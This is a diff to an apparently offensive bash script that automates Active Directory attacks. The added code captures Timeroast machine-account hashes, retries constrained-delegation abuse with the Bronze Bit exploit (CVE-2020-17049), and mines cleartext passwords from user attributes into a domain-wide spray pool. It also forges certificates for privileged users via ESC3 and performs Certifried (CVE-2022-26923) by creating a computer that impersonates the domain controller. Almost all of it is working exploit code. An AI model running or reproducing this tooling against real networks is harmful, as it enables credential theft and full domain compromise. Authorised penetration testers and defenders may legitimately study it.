@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.51.3"
+readonly VERSION="1.53.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 KERBRUTE_RC4_DEAD=0               # set when the DC rejects RC4 (KDC_ERR_ETYPE_NOSUPP) → kerbrute unusable, spray via netexec
@@ -1041,30 +1041,66 @@ phase_asreproast() {
 # ===========================================================================
 #  TIME ROASTING  (MS-SNTP machine-account hashes, no domain creds required)
 # ===========================================================================
+# RID → machine-account map. Every timeroast hash is keyed by the account's RID (the
+# tail of its objectSid); on its own that's just a number. Resolve it once, over LDAP,
+# so a cracked hash names a real computer we can act as (RBCD / Silver Ticket), and so
+# the captured hashes are human-readable. Writes "RID<TAB>sAMAccountName" lines.
+_timeroast_build_map() {
+    local mapf="$1"; : >"$mapf"
+    [[ "$HAVE_AUTH" != "1" || "$CAP_LDAP" != "1" ]] && return
+    have bloodyAD || return
+    local ba; mapfile -t ba < <(bloody_args)
+    # objectSid is emitted as S-1-5-21-…-<RID>; the RID is the last hyphen-field.
+    # bloodyAD prints one blank-line-separated record per object and does NOT guarantee
+    # attribute order (objectSid usually precedes sAMAccountName), so collect both fields
+    # and emit on the record boundary rather than assuming which line comes first.
+    bloodyAD "${ba[@]}" get search \
+        --filter '(objectClass=computer)' --attr sAMAccountName,objectSid 2>/dev/null \
+    | awk '
+        function flush(){ if(sid!="" && sam!="") print sid"\t"sam; sid=""; sam="" }
+        /^[[:space:]]*$/ { flush(); next }
+        /^objectSid:.*S-1-5-21-/ { s=$0; sub(/.*-/,"",s); sid=s }
+        /^sAMAccountName:/ { sam=$2 }
+        END{ flush() }
+    ' >>"$mapf"
+}
+
 phase_timeroast() {
     [[ "$STEALTH" == "1" ]] && { info "Stealth mode: skipping Timeroast"; return; }
     [[ -z "$DOMAIN" ]] && { warn "No domain, skipping Timeroast"; return; }
 
     section "TIME ROASTING · MS-SNTP machine-account hashes"
     local outf="$OUTDIR/timeroast_hashes.txt"; : >"$outf"
+    local mapf="$OUTDIR/timeroast_map.txt"
 
     # Opportunistic by design: recent NetExec builds include a timeroast module.
     # If the module is missing or the DC does not answer MS-SNTP requests, this
     # phase simply records no hashes and the engine keeps pivoting normally.
+    # CRITICAL: keep ONLY the hashcat-parseable token `<RID>:$sntp-ms$<md5>$<salt>` —
+    # the nxc line is prefixed with "TIMEROAST <ip> <port> <host>" columns that make
+    # hashcat choke ("Separator unmatched"). We strip them here so -m 31300 loads clean.
     if [[ -n "$NXC" ]] && nxc_has_module smb timeroast; then
         subsection "NetExec timeroast module"
         run "$NXC smb $DC_IP -u '' -p '' -M timeroast"
         $NXC smb "$DC_IP" -u '' -p '' -M timeroast 2>&1 | tee -a "$LOGFILE" \
-            | grep -E '(\$sntp-ms\$|\$krb5pa\$|\$krb5tgs\$|\$krb5asrep\$)' >>"$outf"
+            | grep -oiE '[0-9]{1,7}:\$sntp-ms\$[0-9a-f]+\$[0-9a-f]+' >>"$outf"
     else
         info "NetExec timeroast module not available in this install → skipping"
     fi
 
     if [[ -s "$outf" ]]; then
         sort -u -o "$outf" "$outf"
+        _timeroast_build_map "$mapf"
         loot "Timeroast hashes captured → timeroast_hashes.txt"
-        while read -r h; do echo -e "      ${C_MAGENTA}${h:0:80}…${C_RESET}"; done <"$outf"
-        ok "Saved to timeroast_hashes.txt (hashcat mode 31300 for \$sntp-ms\$)"
+        # Show each hash next to the machine account its RID resolves to (when known).
+        local rid acct
+        while IFS= read -r h; do
+            rid="${h%%:*}"; acct=""
+            [[ -s "$mapf" ]] && acct=$(awk -F'\t' -v r="$rid" '$1==r{print $2; exit}' "$mapf")
+            echo -e "      ${C_MAGENTA}${h:0:72}…${C_RESET}  ${C_DIM}(RID ${rid}${acct:+ → ${acct}})${C_RESET}"
+        done <"$outf"
+        [[ -s "$mapf" ]] && ok "RID→account map → timeroast_map.txt ($(wc -l <"$mapf") computer accounts)"
+        ok "Saved to timeroast_hashes.txt (hashcat -m 31300 --username for \$sntp-ms\$)"
         [[ "$DO_CRACK" == "1" ]] && crack_hashes "$outf" 31300 "Timeroast"
     else
         info "No Timeroast hashes captured (module unavailable, patched target, or no MS-SNTP response)"
@@ -1541,24 +1577,37 @@ phase_delegation_abuse() {
 
     section "CONSTRAINED DELEGATION ABUSE · S4U to Administrator"
     loot "Current identity appears delegated to ${C_BOLD}$spn${C_RESET} → requesting Administrator service ticket"
-    local args=()
-    if [[ -n "$HASH" ]]; then args=(-hashes ":$HASH")
-    elif [[ -n "$PASS" ]]; then args=()
-    else info "No reusable password/hash for getST; skipping delegation abuse"; return; fi
+    [[ -z "$HASH" && -z "$PASS" ]] && { info "No reusable password/hash for getST; skipping delegation abuse"; return; }
 
+    # Build the getST identity+creds once, then run it. A first, clean S4U attempt; if it
+    # yields no ticket we retry with Bronze Bit (-force-forwardable, CVE-2020-17049): the
+    # S4U2Self ticket for a "sensitive / cannot be delegated" or Protected-Users target
+    # comes back NON-forwardable, so S4U2Proxy is refused — force-forwardable re-encrypts
+    # it (we hold the delegated account's key) so the proxy step accepts it. Harmless when
+    # the target was already delegatable, so it's a pure fallback, never the first try.
+    local -a idargs=(); local princ
+    if [[ -n "$HASH" ]]; then princ="$(imp_principal)"; idargs=(-hashes ":$HASH")
+    else princ="$(imp_principal):${PASS}"; idargs=(); fi
+    _getst_s4u() {   # $1 = extra flag(s)
+        ( cd "$OUTDIR" && impacket-getST -spn "$spn" -impersonate Administrator "$princ" "${idargs[@]}" -dc-ip "$DC_IP" $1 2>&1 ) | tee -a "$LOGFILE"
+    }
     local before after cc
     before=$(find "$OUTDIR" -maxdepth 1 -name '*.ccache' -printf '%f\n' 2>/dev/null | sort)
-    if [[ -n "$HASH" ]]; then
-        run "impacket-getST -spn $spn -impersonate Administrator $(imp_principal) -hashes :$HASH -dc-ip $DC_IP"
-        ( cd "$OUTDIR" && impacket-getST -spn "$spn" -impersonate Administrator "$(imp_principal)" "${args[@]}" -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
-    else
-        run "impacket-getST -spn $spn -impersonate Administrator $(imp_principal):*** -dc-ip $DC_IP"
-        ( cd "$OUTDIR" && impacket-getST -spn "$spn" -impersonate Administrator "$(imp_principal):${PASS}" -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
-    fi
+    run "impacket-getST -spn $spn -impersonate Administrator ${princ/:*/:***} -dc-ip $DC_IP"
+    _getst_s4u ""
     after=$(find "$OUTDIR" -maxdepth 1 -name '*.ccache' -printf '%f\n' 2>/dev/null | sort)
     cc=$(comm -13 <(printf '%s\n' "$before") <(printf '%s\n' "$after") | head -1)
     [[ -z "$cc" ]] && cc=$(find "$OUTDIR" -maxdepth 1 -iname '*Administrator*.ccache' -printf '%f\n' 2>/dev/null | head -1)
-    [[ -z "$cc" ]] && { warn "S4U ticket was not produced"; return; }
+    if [[ -z "$cc" ]]; then
+        warn "S4U gave no ticket on the clean attempt → retrying with Bronze Bit (-force-forwardable)"
+        run "impacket-getST … -force-forwardable  # CVE-2020-17049 (Protected Users / not-delegatable target)"
+        _getst_s4u "-force-forwardable"
+        after=$(find "$OUTDIR" -maxdepth 1 -name '*.ccache' -printf '%f\n' 2>/dev/null | sort)
+        cc=$(comm -13 <(printf '%s\n' "$before") <(printf '%s\n' "$after") | head -1)
+        [[ -z "$cc" ]] && cc=$(find "$OUTDIR" -maxdepth 1 -iname '*Administrator*.ccache' -printf '%f\n' 2>/dev/null | head -1)
+        [[ -n "$cc" ]] && loot "★ Bronze Bit worked → forwardable Administrator ticket forced"
+    fi
+    [[ -z "$cc" ]] && { warn "S4U ticket was not produced (even with -force-forwardable)"; return; }
 
     loot "★ Constrained delegation → Administrator ticket: ${C_BOLD}$cc${C_RESET}"
     note_cred_source "Administrator@$spn" "constrained delegation S4U by $USER"
@@ -2010,6 +2059,11 @@ phase_adcs() {
     if [[ "$ADCS_PWNED" != "1" && "$DO_ABUSE" == "1" && -n "$ca" ]]; then
         _adcs_esc15_blind "$ca" && ADCS_PWNED=1
     fi
+    # Certifried (CVE-2022-26923): not a per-template flag certipy reports, so try it
+    # generically when nothing else reached Administrator and we can create a computer.
+    if [[ "$ADCS_PWNED" != "1" && "$DO_ABUSE" == "1" && -n "$ca" ]]; then
+        _adcs_certifried "$ca" "$cout" && ADCS_PWNED=1
+    fi
 }
 
 # ===========================================================================
@@ -2275,6 +2329,80 @@ phase_post_da() {
             && mv -f Administrator.ccache silver_cifs_Administrator.ccache 2>/dev/null )
         [[ -f "$OUTDIR/silver_cifs_Administrator.ccache" ]] \
             && loot "★ Silver ticket forged (cifs/${DC_FQDN}) → silver_cifs_Administrator.ccache"
+    fi
+}
+
+# A string that plausibly IS a password (safe to spray ONLINE across every account):
+# no whitespace, sane length, and some complexity (a digit or a symbol). Prose in a
+# description ("Service account for backups") fails this and is only ever tried against
+# its OWN owner (a single, lockout-safe attempt) — never sprayed domain-wide.
+_is_pw_shaped() {
+    local s="$1"
+    [[ "$s" =~ [[:space:]] ]] && return 1
+    (( ${#s} < 4 || ${#s} > 64 )) && return 1
+    [[ "$s" =~ [0-9] || "$s" =~ [^a-zA-Z0-9] ]]
+}
+
+# ===========================================================================
+#  CREDENTIALS IN DIRECTORY ATTRIBUTES  —  cleartext / legacy passwords admins
+#  stash in description / info / comment / userPassword / unixUserPassword. One LDAP
+#  read, very high hit-rate. Each value is queued against its OWNING account (safe,
+#  single attempt); only password-shaped values also enter the online spray pool.
+# ===========================================================================
+phase_attr_passwords() {
+    [[ "$HAVE_AUTH" != "1" || "$CAP_LDAP" != "1" ]] && return
+    have bloodyAD || return
+    section "DIRECTORY-ATTRIBUTE CREDENTIALS · description / info / userPassword …"
+    local ba; mapfile -t ba < <(bloody_args)
+    local raw; raw=$(bloodyAD "${ba[@]}" get search \
+        --filter '(&(objectClass=user)(|(description=*)(info=*)(comment=*)(userPassword=*)(unixUserPassword=*)))' \
+        --attr sAMAccountName,description,info,comment,userPassword,unixUserPassword 2>/dev/null)
+    if [[ -z "$raw" ]]; then info "No user carries a description/info/comment/userPassword value"; return; fi
+    # Flatten to "sam<TAB>attr<TAB>value" — one line per interesting attribute. bloodyAD
+    # prints sAMAccountName LAST in each blank-line-separated record, so buffer the whole
+    # record and emit on the boundary rather than assuming sam is seen first.
+    local flat; flat=$(awk '
+        function flush(){ if(sam!=""){ for(a in vals) if(vals[a]!="") print sam"\t"a"\t"vals[a] } sam=""; delete vals }
+        /^[[:space:]]*$/ { flush(); next }
+        /^sAMAccountName:/ { sam=$2; next }
+        /^(description|info|comment|userPassword|unixUserPassword):/ {
+            attr=$1; sub(/:$/,"",attr); val=$0; sub(/^[^:]+:[[:space:]]*/,"",val)
+            if(val!="") vals[attr]=val
+        }
+        END{ flush() }' <<<"$raw")
+    [[ -z "$flat" ]] && { info "No readable attribute values"; return; }
+
+    local sam attr val dec found=0
+    while IFS=$'\t' read -r sam attr val; do
+        [[ -z "$sam" || -z "$val" ]] && continue
+        # userPassword / unixUserPassword are octet strings — often base64 in the dump.
+        if [[ "$attr" == *[Pp]assword && "$val" =~ ^[A-Za-z0-9+/]+=*$ && $(( ${#val} % 4 )) -eq 0 ]]; then
+            dec=$(printf '%s' "$val" | base64 -d 2>/dev/null)
+            [[ -n "$dec" && "$dec" =~ ^[[:print:]]+$ ]] && val="$dec"
+        fi
+        found=1
+        detail "  ${C_YELLOW}${sam}${C_RESET} ${C_DIM}[${attr}]${C_RESET} → ${C_BOLD}${val}${C_RESET}"
+        printf '%-24s %-16s %s\n' "$sam" "$attr" "$val" >>"$OUTDIR/attribute_creds.txt"
+        # Always try the whole value against its OWN owner (one attempt, lockout-safe) —
+        # covers the case where the attribute IS the password.
+        note_cred_source "$sam" "password in AD attribute '$attr'"
+        queue_cred "$sam" "$val" "" "password in $attr"
+        _is_pw_shaped "$val" && add_secret "$val" "AD attribute '$attr' of $sam"
+        # Also mine password-shaped TOKENS out of prose ("Password is Summer2024!" →
+        # Summer2024!): try each against the owner and add it to the online spray pool.
+        local tok
+        for tok in $val; do
+            [[ "$tok" == "$val" ]] && continue
+            if _is_pw_shaped "$tok"; then
+                add_secret "$tok" "token in '$attr' of $sam"
+                queue_cred "$sam" "$tok" "" "token in $attr"
+            fi
+        done
+    done <<<"$flat"
+    if [[ "$found" == "1" ]]; then
+        loot "★ Harvested credential material from directory attributes → attribute_creds.txt"
+    else
+        info "No usable attribute credentials"
     fi
 }
 
@@ -4356,20 +4484,239 @@ _adcs_req_admin() {                     # _adcs_req_admin <ca> <tpl> <label> <wi
     _adcs_pwn_pfx "$pfx" "$label"
 }
 
-# ESC3 — Enrollment Agent: get an agent cert, then request On-Behalf-Of Administrator.
+# Group-name keywords that flag a NON-default group as likely holding a real
+# escalation primitive (SeManageVolume, LAPS read, backup, delegation, cert issuance,
+# remote access, …). Used purely to ORDER the on-behalf-of candidates so the promising
+# ones are impersonated first — it never excludes anyone.
+HOT_GROUP_RE='Storage|Backup|Manage|Admin|Operator|LAPS|Server|Cert|CRA|Remote|Delegat|DNS|Exchange|\bKey\b|GPO|Polic|Sync|Sccm|Config|Print|Hyper'
+
+# Domain users that carry a `mail` attribute — the ONLY principals an email-requiring
+# template (ESC3 SignedUser/User, ESC1 with email flags, …) can be impersonated onto —
+# ranked by how interesting their group membership is, best first:
+#   tier 1 · member of a classic privileged group (ADMIN_GROUP_RE)
+#   tier 2 · member of a custom group whose name screams privilege (HOT_GROUP_RE) —
+#            e.g. 'Domain Storage Managers', 'Domain CRA Managers'
+#   tier 3 · member of any other NON-default / custom group (Help Desk, Finance, …)
+#   tier 4 · has an email, default groups only
+# NOTE bloodyAD prints ALL of a user's groups on one "memberOf:" line joined by "; ",
+# so we split on ';' and score every group, not just the first. Accounts we already own
+# (or our current identity) are skipped — impersonating ourselves is no escalation.
+# Prints up to ${1:-20} sAMAccountNames, best first (ordering only — we still enrol all).
+_adcs_hot_email_targets() {
+    local limit="${1:-20}"
+    [[ "$CAP_LDAP" != "1" ]] && return
+    have bloodyAD || return
+    local ba; mapfile -t ba < <(bloody_args)
+    local raw; raw=$(bloodyAD "${ba[@]}" get search \
+        --filter '(&(objectCategory=person)(objectClass=user)(mail=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' \
+        --attr sAMAccountName,memberOf 2>/dev/null)
+    [[ -z "$raw" ]] && return
+    # Blank-line-separated records. Score each on its memberOf groups, emit "tier<TAB>sam".
+    local ranked
+    ranked=$(awk -v adm="$ADMIN_GROUP_RE" -v hot="$HOT_GROUP_RE" '
+        function flush(){
+            if(sam!=""){ tier=(hasadm?1:(hashot?2:(hascustom?3:4))); print tier"\t"sam }
+            sam=""; hasadm=0; hashot=0; hascustom=0
+        }
+        /^[[:space:]]*$/ { flush(); next }
+        /^sAMAccountName:/ { sam=$2 }
+        /^memberOf:/ {
+            line=$0; sub(/^memberOf:[[:space:]]*/,"",line)
+            n=split(line, grps, /;[[:space:]]*/)          # all groups on this one line
+            for(i=1;i<=n;i++){
+                cn=grps[i]; sub(/^CN=/,"",cn); sub(/,.*/,"",cn)   # CN of each group
+                if(cn ~ adm) hasadm=1
+                else if(cn ~ hot) hashot=1
+                else if(cn !~ /^(Domain Users|Users|Domain Computers|Domain Guests)$/) hascustom=1
+            }
+        }
+        END{ flush() }
+    ' <<<"$raw" | sort -t$'\t' -k1,1n -s)
+    # Post-filter owned / self, keep tier order, cap at $limit.
+    local n=0 tier sam
+    while IFS=$'\t' read -r tier sam; do
+        [[ -z "$sam" ]] && continue
+        [[ "${sam,,}" == "${USER,,}" ]] && continue
+        [[ -n "${OWNED_GROUPS[${sam,,}]:-}" ]] && continue
+        echo "$sam"; (( ++n >= limit )) && break
+    done <<<"$ranked"
+}
+
+# One On-Behalf-Of request + pivot. Returns 0 = pivoted, 1 = failed, 2 = the CA rejected
+# it because the template needs an email the target lacks (0x80094812) — the caller uses
+# that signal to stop hammering Administrator and switch to email-bearing users.
+_adcs_esc3_obo() {                      # _adcs_esc3_obo <ca> <agent-pfx> <target-tpl> <obo-user>
+    local ca="$1" agent="$2" otpl="$3" who="$4"
+    info "  ESC3: on-behalf-of ${C_BOLD}${who}${C_RESET} via template '${otpl}'…"
+    local o2; o2=$( cd "$OUTDIR" && yes 2>/dev/null | "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$otpl" \
+        -on-behalf-of "${DOMAIN%%.*}\\${who}" -pfx "$agent" \
+        -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ); echo "$o2" | tee -a "$LOGFILE"
+    # Email-required wall — the SignedUser/User template demands a subject/SAN email and
+    # this target has none (Administrator on most domains). Signal the caller to pivot.
+    # certipy ≤4.8 says CERTSRV_E_SUBJECT_EMAIL_REQUIRED (0x80094812); certipy 5.x surfaces
+    # the SAME condition as 0x80093102 CRYPT_E_ASN1_EOD (it can't ASN.1-encode an empty
+    # subject) — both mean "this identity has no email, pivot to one that does".
+    grep -qiE 'CERTSRV_E_SUBJECT_EMAIL_REQUIRED|0x80094812|email name is unavailable|0x80093102|CRYPT_E_ASN1_EOD' <<<"$o2" && return 2
+    local pfx; pfx=$(grep -oiP "(?:Saving|Wrote) certificate and private key to '\K[^']+" <<<"$o2" | tail -1 | xargs -r basename)
+    [[ -z "$pfx" || ! -f "$OUTDIR/$pfx" ]] && return 1
+    _adcs_pwn_pfx "$pfx" "ESC3→${who}"
+}
+
+# Full (non -vulnerable) certipy find, cached to disk — the -vulnerable dump only lists
+# the flagged template (e.g. Delegated-CRA), NOT the plain client-auth target template
+# the ESC3 on-behalf-of request actually needs (e.g. SignedUser). Run once, reuse.
+_adcs_full_find() {
+    local f="$OUTDIR/certipy_full_find.txt"
+    [[ -s "$f" ]] && { cat "$f"; return; }
+    _adcs_setauth
+    "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy find "${_ADCS_AUTH[@]}" \
+        -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" -stdout 2>/dev/null | tee "$f"
+}
+
+# USER-oriented client-auth templates — the valid ESC3 on-behalf-of targets. A cert that
+# impersonates a *user* must build its subject from that user's identity, so the template
+# needs a user name flag (SubjectAltRequireUpn / *RequireEmail); machine-oriented
+# client-auth templates (SubjectAltRequireDns — KerberosAuthentication, Workstation,
+# DomainControllerAuthentication…) can't carry a user and are skipped. ESS templates are
+# excluded (that's ESC1, handled elsewhere). Emitted user-first, de-duplicated.
+_adcs_user_clientauth_tpl() {            # _adcs_user_clientauth_tpl <find-output>
+    awk 'BEGIN{IGNORECASE=1}
+        function flush(){ if(name!="" && ca && !ess && usr) print name; name="";ca=0;ess=0;usr=0 }
+        /Template Name/{ flush(); name=$0; sub(/.*:[[:space:]]*/,"",name) }
+        /Client Authentication.*:[[:space:]]*True/{ ca=1 }
+        /Enrollee Supplies Subject.*:[[:space:]]*True/{ ess=1 }
+        /SubjectAltRequireUpn|SubjectRequireEmail|SubjectAltRequireEmail/{ usr=1 }
+        END{ flush() }' <<<"$1" | sed 's/[[:space:]]*$//' | awk '!seen[$0]++'
+}
+
+# MACHINE-oriented client-auth templates — the Certifried (CVE-2022-26923) targets. Here
+# the cert SAN is built from the account's dNSHostName, so we want templates whose name
+# flag is DNS-based (SubjectAltRequireDns), client-auth, non-ESS. Property-based, no names.
+_adcs_machine_clientauth_tpl() {         # _adcs_machine_clientauth_tpl <find-output>
+    awk 'BEGIN{IGNORECASE=1}
+        function flush(){ if(name!="" && ca && !ess && dns) print name; name="";ca=0;ess=0;dns=0 }
+        /Template Name/{ flush(); name=$0; sub(/.*:[[:space:]]*/,"",name) }
+        /Client Authentication.*:[[:space:]]*True/{ ca=1 }
+        /Enrollee Supplies Subject.*:[[:space:]]*True/{ ess=1 }
+        /SubjectAltRequireDns|SubjectAltRequireDomainDns/{ dns=1 }
+        END{ flush() }' <<<"$1" | sed 's/[[:space:]]*$//' | awk '!seen[$0]++'
+}
+
+# ESC3 — Enrollment Agent. Enrol an agent cert once, then request a client-auth cert
+# On-Behalf-Of a privileged user. The naive path (OBO Administrator via 'User') dies on
+# real domains: the client-auth template often requires an email in the subject/SAN
+# (SubjectRequireEmail / SubjectAltRequireEmail) and Administrator has none → the CA
+# returns 0x80094812 CERTSRV_E_SUBJECT_EMAIL_REQUIRED. So we (1) enrol the agent cert,
+# (2) discover the real client-auth target template(s) from the certipy find output
+# (not hard-coded 'User' — many CAs use 'SignedUser'), (3) try Administrator first, and
+# (4) the moment the email wall shows up, pivot the impersonation to the highest-value
+# users that DO carry an email, requesting a cert per candidate until one yields a
+# usable, more-privileged identity.
 _adcs_esc3() {
-    local ca="$1" agenttpl="$2"; _adcs_setauth
-    abuse_confirm "  ESC3: use Enrollment Agent template '$agenttpl' to enrol on behalf of Administrator?" || return 1
+    local ca="$1" agenttpl="$2" cout="${3:-}"; _adcs_setauth
+    abuse_confirm "  ESC3: use Enrollment Agent template '$agenttpl' to enrol on behalf of a privileged user?" || return 1
     local o1; o1=$( cd "$OUTDIR" && yes 2>/dev/null | "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$agenttpl" \
         -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ); echo "$o1" | tee -a "$LOGFILE"
     local agent; agent=$(grep -oiP "(?:Saving|Wrote) certificate and private key to '\K[^']+" <<<"$o1" | tail -1 | xargs -r basename)
     [[ -z "$agent" || ! -f "$OUTDIR/$agent" ]] && { warn "  ESC3: no enrollment-agent PFX produced"; return 1; }
-    local o2; o2=$( cd "$OUTDIR" && yes 2>/dev/null | "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template User \
-        -on-behalf-of "${DOMAIN%%.*}\\administrator" -pfx "$agent" \
-        -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ); echo "$o2" | tee -a "$LOGFILE"
-    local pfx; pfx=$(grep -oiP "(?:Saving|Wrote) certificate and private key to '\K[^']+" <<<"$o2" | tail -1 | xargs -r basename)
-    _adcs_pwn_pfx "$pfx" "ESC3"
+
+    # (2) target client-auth templates: USER-oriented client-auth templates (e.g.
+    #     SignedUser). Look in the passed -vulnerable dump first; if it doesn't list one
+    #     (it usually won't — SignedUser isn't "vulnerable" by itself), run a full find.
+    #     'User' (certipy's default) is kept as a last-resort fallback.
+    local -a otpls=(); local t
+    [[ -n "$cout" ]] && while IFS= read -r t; do [[ -n "$t" ]] && otpls+=("$t"); done < <(_adcs_user_clientauth_tpl "$cout")
+    if [[ ${#otpls[@]} -eq 0 ]]; then
+        info "  ESC3: resolving the on-behalf-of target template from a full CA enumeration…"
+        while IFS= read -r t; do [[ -n "$t" ]] && otpls+=("$t"); done < <(_adcs_user_clientauth_tpl "$(_adcs_full_find)")
+    fi
+    printf '%s\n' "${otpls[@]}" | grep -qix 'User' || otpls+=("User")
+    info "  ESC3: on-behalf-of target template(s): ${otpls[*]}"
+
+    # (3) OBO targets: Administrator first (the clean win when it carries an email), then
+    #     the ranked email-bearing users. Computed up front so the pivot is instant.
+    local -a hot=(); while IFS= read -r t; do [[ -n "$t" ]] && hot+=("$t"); done < <(_adcs_hot_email_targets 20)
+
+    # KEY DESIGN CHOICE: once the email wall proves Administrator is unreachable, we do
+    # NOT stop at the first user whose cert we extract — that first user (alphabetically
+    # earliest) is almost never the one holding the escalation primitive. We extract a
+    # cert for EVERY email-bearing user and queue EACH recovered identity; the pivot
+    # engine then assesses them all and finds the one with the real path (e.g. Ryan.K →
+    # SeManageVolume). Administrator, if reachable, is still the instant prize → early out.
+    local otpl who rc wins=0 admin_done=0
+    for otpl in "${otpls[@]}"; do
+        # Administrator first (once) — the instant prize when it carries an email.
+        if [[ "$admin_done" != 1 ]]; then
+            _adcs_esc3_obo "$ca" "$agent" "$otpl" "administrator"; rc=$?
+            [[ "$rc" == 0 ]] && return 0        # Administrator cert → game over, take it
+            admin_done=1
+            if [[ ${#hot[@]} -eq 0 ]]; then
+                warn "  ESC3: Administrator has no email for this template and LDAP found no email-bearing users to pivot to (check CAP_LDAP)"
+            else
+                loot "  ESC3: Administrator unreachable via cert (no email in SAN) → harvesting certs for ${#hot[@]} email-bearing user(s): ${hot[*]}"
+            fi
+        fi
+        # Harvest a cert for every email-bearing user (ranked). Do NOT stop at the first —
+        # the earliest is rarely the one holding the escalation primitive; queue them ALL
+        # so the pivot engine can find the real path (e.g. Ryan.K → SeManageVolume).
+        for who in "${hot[@]}"; do
+            _adcs_esc3_obo "$ca" "$agent" "$otpl" "$who" && (( wins++ ))
+        done
+        (( wins > 0 )) && break               # this template worked → no need for others
+    done
+    if (( wins > 0 )); then
+        loot "  ESC3: harvested $wins user certificate(s) → identities queued for pivoting (agent cert: $agent)"
+        return 0
+    fi
+    warn "  ESC3: no on-behalf-of request yielded a usable identity — review certipy_find.txt (agent cert saved: $agent)"
+    return 1
 }
+# Certifried (CVE-2022-26923) — with MachineAccountQuota>0 we create a computer, set its
+# dNSHostName to a DC's FQDN, and enrol a machine client-auth cert: the CA builds the SAN
+# from dNSHostName, so the cert authenticates AS THE DC → DC$ hash → DCSync. Patched DCs
+# embed the requester SID and reject the collision (this then simply fails and we move on).
+# Template chosen by PROPERTY (machine client-auth), never by name; gated on MAQ + --abuse.
+_adcs_certifried() {                     # _adcs_certifried <ca> <find-output>
+    local ca="$1" cout="$2"
+    [[ "$DO_ABUSE" != "1" || "$IS_DC_ADMIN" == "1" ]] && return 1
+    have certipy || return 1
+    _adcs_setauth
+    # Precondition: MachineAccountQuota > 0 (the domain-root attribute). No quota, no
+    # computer creation → Certifried is impossible; say so and skip cleanly.
+    local ba; mapfile -t ba < <(bloody_args)
+    local ddn maq
+    ddn="dc=${DOMAIN//./,dc=}"
+    maq=$(bloodyAD "${ba[@]}" get object "$ddn" --attr ms-DS-MachineAccountQuota 2>/dev/null | grep -oiP 'MachineAccountQuota:\s*\K[0-9]+')
+    if [[ -z "$maq" || "$maq" -le 0 ]]; then
+        info "  Certifried: MachineAccountQuota=${maq:-0} → can't create a computer, skipping"
+        return 1
+    fi
+    # Target template: a MACHINE client-auth template (SAN from dNSHostName). Look in the
+    # passed dump, else a full find. Fall back to certipy's default machine template name.
+    local mtpl; mtpl=$(_adcs_machine_clientauth_tpl "$cout" | head -1)
+    [[ -z "$mtpl" ]] && mtpl=$(_adcs_machine_clientauth_tpl "$(_adcs_full_find)" | head -1)
+    [[ -z "$mtpl" ]] && mtpl="Machine"
+    abuse_confirm "  Certifried (CVE-2022-26923): create a computer, spoof its dNSHostName to the DC, enrol '$mtpl' as the DC?" || return 1
+
+    local cn="adcertpwn" cpass="Cert1234!" dcfqdn="${DC_FQDN:-$DCT}"
+    info "  Certifried: creating computer ${C_BOLD}${cn}\$${C_RESET} with dNSHostName=${dcfqdn} (MAQ=$maq)…"
+    local o1; o1=$( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy account create "${_ADCS_AUTH[@]}" \
+        -user "${cn}" -pass "$cpass" -dns "$dcfqdn" -dc-ip "$DC_IP" 2>&1 ); echo "$o1" | tee -a "$LOGFILE"
+    if ! grep -qiE 'Successfully created|already exists' <<<"$o1"; then
+        warn "  Certifried: could not create the computer account (no rights / MAQ enforced elsewhere)"; return 1
+    fi
+    rb_record "Certifried: created computer ${cn}\$" \
+              "certipy account delete -u '${USER}@${DOMAIN}' -user '${cn}' -dc-ip '$DC_IP'  # remove the spoofed computer"
+    # Enrol the machine cert AS the new computer; its SAN = dNSHostName = the DC.
+    local o2; o2=$( cd "$OUTDIR" && yes 2>/dev/null | env -u KRB5CCNAME timeout -k 15 "${CERTIPY_TO:-120}" certipy req \
+        -u "${cn}\$@${DOMAIN}" -p "$cpass" -ca "$ca" -template "$mtpl" -dc-ip "$DC_IP" -target "$dcfqdn" 2>&1 ); echo "$o2" | tee -a "$LOGFILE"
+    local pfx; pfx=$(grep -oiP "(?:Saving|Wrote) certificate and private key to '\K[^']+" <<<"$o2" | tail -1 | xargs -r basename)
+    [[ -z "$pfx" || ! -f "$OUTDIR/$pfx" ]] && { warn "  Certifried: no cert issued (DC likely patched — requester SID mismatch)"; return 1; }
+    # The cert authenticates as the DC machine account (not our computer) → DC$ hash.
+    _ADCS_ENV=(env -u KRB5CCNAME)
+    _adcs_pwn_pfx "$pfx" "Certifried"
+}
+
 # ESC4 — writable template ACL: push an ESC1-vulnerable config, exploit, then restore.
 _adcs_esc4() {
     local ca="$1" tpl="$2"; _adcs_setauth
@@ -4647,7 +4994,7 @@ _abuse_adcs() {
                    [[ -z "$_obo" ]] && _obo=$(_adcs_clientauth_tpl "$cout" | head -1)
                    [[ -z "$_obo" ]] && _obo="User"
                    _adcs_esc15_exploit "$ca" "$tpl" "$_obo" && return 0 ;;
-            ESC3)  _adcs_esc3  "$ca" "$tpl" && return 0 ;;
+            ESC3)  _adcs_esc3  "$ca" "$tpl" "$cout" && return 0 ;;
             ESC4)  _adcs_esc4  "$ca" "$tpl" && return 0 ;;
             ESC7)  _adcs_esc7  "$ca"        && return 0 ;;
             ESC13) _adcs_esc13 "$ca" "$tpl" && return 0 ;;
@@ -5835,7 +6182,7 @@ crack_hashes() {
         case "$label" in
             AS-REP)     k=$(grep -oP '\$krb5asrep\$[0-9]+\$\K[^@:]+' <<<"$line" | head -1) ;;
